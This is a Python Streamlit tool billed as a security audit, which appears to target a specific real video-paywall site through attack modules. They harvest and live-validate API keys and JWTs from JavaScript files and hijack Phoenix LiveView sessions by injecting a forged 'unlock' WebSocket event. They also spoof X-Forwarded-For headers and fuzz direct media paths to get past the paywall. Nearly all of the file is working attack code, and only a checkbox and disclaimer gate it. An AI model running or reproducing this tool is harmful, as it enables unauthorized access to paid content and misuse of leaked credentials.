import re
import json
import concurrent.futures
from urllib.parse import urljoin, urlparse

import requests
import streamlit as st
from bs4 import BeautifulSoup
import websocket
from requests.exceptions import RequestException

# ==========================================
# CONFIGURATION & PAYLOADS
# ==========================================
UUID_REGEX = re.compile(r"[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}", re.IGNORECASE)
TON_KEY_REGEX = re.compile(r"apikey\s+([a-f0-9]{64})", re.IGNORECASE)

REQUEST_TIMEOUT = 10
BASE_HEADERS = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}

BYPASS_HEADERS = {
    "X-Forwarded-For": "127.0.0.1",
    "X-Real-IP": "127.0.0.1",
    "X-Original-URL": "/posts"
}

MEDIA_PATHS = [
    "uploads/videos/{uuid}.mp4", "uploads/videos/{uuid}.m3u8",
    "media/{uuid}.mp4", "media/{uuid}.m3u8", "videos/{uuid}.mp4",
    "stream/{uuid}.m3u8", "hls/{uuid}/playlist.m3u8"
]

# ==========================================
# HELPER FUNCTIONS
# ==========================================
def normalize_root(raw_url: str) -> str:
    parsed = urlparse(raw_url.strip())
    return f"{parsed.scheme}://{parsed.netloc}"

def build_url(root: str, path: str) -> str:
    return urljoin(root + "/", path.lstrip("/"))

def make_session(cookie="", auth=""):
    s = requests.Session()
    s.headers.update(BASE_HEADERS)
    if cookie: s.headers["Cookie"] = cookie
    if auth: s.headers["Authorization"] = auth
    return s

def safe_request(session, method, url, headers=None, allow_redirects=True):
    try:
        req_headers = session.headers.copy()
        if headers: req_headers.update(headers)
        resp = session.request(method, url, headers=req_headers, timeout=REQUEST_TIMEOUT, allow_redirects=allow_redirects)
        return resp, None
    except Exception as e:
        return None, str(e)

# ==========================================
# AGGRESSIVE ATTACK MODULES
# ==========================================

def module_liveview_hijack(session, root, uuid):
    """
    True LiveView Hijack: Extracts CSRF token & Session from HTML, then connects 
    to the WebSocket and injects an 'unlock' event.
    """
    results = []
    target_url = build_url(root, f"unlock/{uuid}")
    
    # 1. Fetch the page to get LiveView tokens
    resp, err = safe_request(session, "GET", target_url)
    if err or not resp or resp.status_code != 200:
        return [{"module": "LiveView Hijack", "target": target_url, "status": "N/A", "verdict": "ERROR", "detail": "Could not fetch target page for token extraction."}]

    soup = BeautifulSoup(resp.text, "html.parser")
    
    # Look for the LiveView root element which holds the session data
    lv_root = soup.find(attrs={"data-phx-session": True}) or soup.find(attrs={"data-phx-main": True})
    csrf_token = None
    
    # Extract CSRF token from meta tag or hidden input
    csrf_meta = soup.find("meta", attrs={"name": "csrf-token"})
    if csrf_meta:
        csrf_token = csrf_meta["content"]
    else:
        csrf_input = soup.find("input", attrs={"name": "_csrf_token"})
        if csrf_input:
            csrf_token = csrf_input["value"]

    if not lv_root or not csrf_token:
        return [{"module": "LiveView Hijack", "target": target_url, "status": "N/A", "verdict": "SECURE", "detail": "Could not locate LiveView session tokens (page may not be LiveView or is heavily obfuscated)."}]

    phx_session = lv_root.get("data-phx-session")
    phx_main = lv_root.get("data-phx-main", "")
    
    # In Phoenix LiveView, the topic is typically 'lv:' + the main ID or session ID
    # We can extract the topic from the 'data-phx-main' attribute (often looks like "phx-GOApmd36UJtvSFTR")
    topic_id = phx_main if phx_main else "phx-" + phx_session[:10]
    topic = f"lv:{topic_id}"

    parsed = urlparse(root)
    ws_url = f"wss://{parsed.netloc}/live/websocket?vsn=2.0.0&_csrf_token={csrf_token}"

    try:
        # 2. Connect to WebSocket
        ws = websocket.create_connection(ws_url, timeout=5)
        
        # 3. Send phx_join with the exact session and URL
        join_payload = {"url": target_url, "session": phx_session}
        join_msg = json.dumps(["1", "1", topic, "phx_join", join_payload])
        ws.send(join_msg)
        
        # Receive the join reply
        try:
            join_reply = ws.recv()
            if '"status":"ok"' not in join_reply and '"status": "ok"' not in join_reply:
                # If the join fails, we might still be able to send events, but let's flag it
                pass
        except:
            pass

        # 4. INJECT THE MALICIOUS EVENT
        # We send an event that mimics clicking the "Unlock" button. 
        # Common LiveView event names for this are "unlock", "play", "buy", or "show_video".
        # We try "unlock" and a generic payload.
        event_payload = {"id": uuid, "video_id": uuid, "pay": "true"}
        event_msg = json.dumps(["1", "2", topic, "unlock", event_payload])
        ws.send(event_msg)

        # 5. Check if the server responds with video data (indicates success)
        try:
            event_reply = ws.recv()
            # If the server sends back a diff that includes a video URL or player, it's vulnerable
            if "video" in event_reply.lower() or "m3u8" in event_reply.lower() or "play" in event_reply.lower():
                verdict = "CRITICAL"
                detail = "LiveView WebSocket accepted unauthenticated event injection. The server responded with content."
            else:
                verdict = "HIGH"
                detail = "LiveView WebSocket accepted the event, but response didn't contain obvious video data. Manual inspection needed."
        except:
            verdict = "HIGH"
            detail = "LiveView WebSocket accepted the event, but connection closed without reply."

        ws.close()
        results.append({"module": "LiveView WebSocket Hijack", "target": ws_url, "status": "101", "verdict": verdict, "detail": detail})

    except Exception as e:
        results.append({"module": "LiveView WebSocket Hijack", "target": ws_url, "status": None, "verdict": "SECURE", "detail": f"WebSocket connection rejected: {str(e)[:80]}"})

    return results

def module_js_secret_scanner(session, root):
    """Scans JS files for leaked API keys."""
    results = []
    target_url = build_url(root, "users/log-in")
    resp, _ = safe_request(session, "GET", target_url)
    if not resp: return results

    soup = BeautifulSoup(resp.text, "html.parser")
    js_files = [script['src'] for script in soup.find_all('script', src=True)]
    
    # Add the known image.js from your screenshot
    if not any("image.js" in js for js in js_files):
        js_files.append("/js/image.js")

    leaked_keys = []

    for js_path in js_files:
        js_url = js_path if js_path.startswith("http") else build_url(root, js_path)
        js_resp, _ = safe_request(session, "GET", js_url)
        if not js_resp or js_resp.status_code != 200: continue

        ton_matches = TON_KEY_REGEX.findall(js_resp.text)
        for key in ton_matches:
            leaked_keys.append({"type": "TON API Key", "key": key, "source": js_url})
            
        jwt_matches = re.findall(r'(eyJ[A-Za-z0-9-_=]+\.[A-Za-z0-9-_=]+\.?[A-Za-z0-9-_.+/=]*)', js_resp.text)
        for key in set(jwt_matches):
             if len(key) > 50:
                 leaked_keys.append({"type": "JWT/Token", "key": key, "source": js_url})

    for item in leaked_keys:
        if item["type"] == "TON API Key":
            ton_api_url = "https://toncenter.com/api/v2/getAddressInformation"
            params = {"address": "EQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAM9c", "api_key": item["key"]}
            try:
                api_resp = requests.get(ton_api_url, params=params, timeout=5)
                verdict = "CRITICAL" if api_resp.status_code == 200 else "HIGH"
                detail = f"TON API Key leaked in {item['source']}. Key is ACTIVE." if api_resp.status_code == 200 else f"TON API Key leaked in {item['source']} (Revoked)."
            except:
                 verdict = "HIGH"
                 detail = f"TON API Key leaked in {item['source']}."
        else:
            verdict = "CRITICAL"
            detail = f"Sensitive {item['type']} leaked in {item['source']}."

        results.append({"module": "JS Secret Leakage", "target": item['source'], "status": "N/A", "verdict": verdict, "detail": detail})

    return results

def module_header_spoofing(session, root, uuid):
    """Tests X-Forwarded-For bypass."""
    url = build_url(root, f"unlock/{uuid}")
    resp, err = safe_request(session, "GET", url, headers=BYPASS_HEADERS, allow_redirects=False)
    if err: return [{"module": "Header Spoofing", "target": url, "status": None, "verdict": "ERROR", "detail": err}]
    
    if resp.status_code == 200 and "log in" not in resp.text.lower():
        return [{"module": "Header Spoofing", "target": url, "status": 200, "verdict": "CRITICAL", "detail": "X-Forwarded-For (127.0.0.1) bypassed paywall!"}]
    return [{"module": "Header Spoofing", "target": url, "status": resp.status_code, "verdict": "SECURE", "detail": f"Headers ignored ({resp.status_code})."}]

def module_concurrent_media_fuzzing(session, root, uuid):
    """Simultaneously tries media paths."""
    results = []
    def check_path(path_template):
        path = path_template.format(uuid=uuid)
        url = build_url(root, path)
        resp, err = safe_request(session, "HEAD", url)
        if err or not resp: return None
        if resp.status_code == 200:
            return {"module": "Media Fuzzing", "target": url, "status": 200, "verdict": "CRITICAL", "detail": f"Direct file access!"}
        return None

    with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
        futures = [executor.submit(check_path, path) for path in MEDIA_PATHS]
        for future in concurrent.futures.as_completed(futures):
            res = future.result()
            if res: results.append(res)
    return results

# ==========================================
# STREAMLIT UI
# ==========================================
def main():
    st.set_page_config(page_title="TESA Security Audit", page_icon="🛡️", layout="wide")
    
    st.title("🛡️ TESA Advanced Threat Simulation")
    st.error("⚠️ **AUTHORIZED TESTING ONLY.** By running this tool, you confirm you are the owner or have explicit permission to test the target domain.")

    with st.sidebar:
        target_url = st.text_input("Target URL", value="https://tesa.co.ke")
        manual_uuid = st.text_input("Specific UUID (Optional)", placeholder="b6aa8a10...")
        cookie_val = st.text_area("Cookie (Optional)")
        
        authorized = st.checkbox("I confirm I have authorization")
        run_btn = st.button("🚀 Run Attack Simulation", type="primary", disabled=not authorized, use_container_width=True)

    if run_btn:
        root = normalize_root(target_url)
        session = make_session(cookie_val)
        all_results = []
        
        with st.spinner("Executing attacks..."):
            test_uuid = manual_uuid or "b6aa8a10-2f4a-4004-a824-8983f00b26c0"
            
            all_results.extend(module_js_secret_scanner(session, root))
            all_results.extend(module_liveview_hijack(session, root, test_uuid))
            all_results.extend(module_header_spoofing(session, root, test_uuid))
            all_results.extend(module_concurrent_media_fuzzing(session, root, test_uuid))

        # --- REPORTING ---
        st.markdown("---")
        st.header("📊 Executive Summary")
        
        crit = sum(1 for r in all_results if r["verdict"] == "CRITICAL")
        high = sum(1 for r in all_results if r["verdict"] == "HIGH")
        
        col1, col2 = st.columns(2)
        col1.metric("Critical Risks", crit, delta="Immediate Action" if crit > 0 else None, delta_color="inverse")
        col2.metric("High Risks", high, delta="Fix Soon" if high > 0 else None, delta_color="inverse")
        
        if crit > 0 or high > 0:
            st.error(f"🚨 **Vulnerabilities Detected:** The platform is currently exposed to unauthorized access.")
        else:
            st.success("✅ **Baseline Secure:** No obvious critical flaws detected.")

        st.header("🔍 Detailed Findings")
        for r in all_results:
            if r["verdict"] == "SECURE": continue
            color = {"CRITICAL": "#c0392b", "HIGH": "#e67e22", "ERROR": "#7f8c8d"}.get(r["verdict"], "#7f8c8d")
            st.markdown(f"""
            <div style="border-left: 5px solid {color}; padding-left: 15px; margin-bottom: 20px;">
                <h4 style="margin:0; color:{color};">[{r['verdict']}] {r['module']}</h4>
                <p style="margin:5px 0;"><strong>Target:</strong> <code>{r['target']}</code></p>
                <p style="margin:5px 0;"><strong>Details:</strong> {r['detail']}</p>
            </div>
            """, unsafe_allow_html=True)

if __name__ == "__main__":
    main()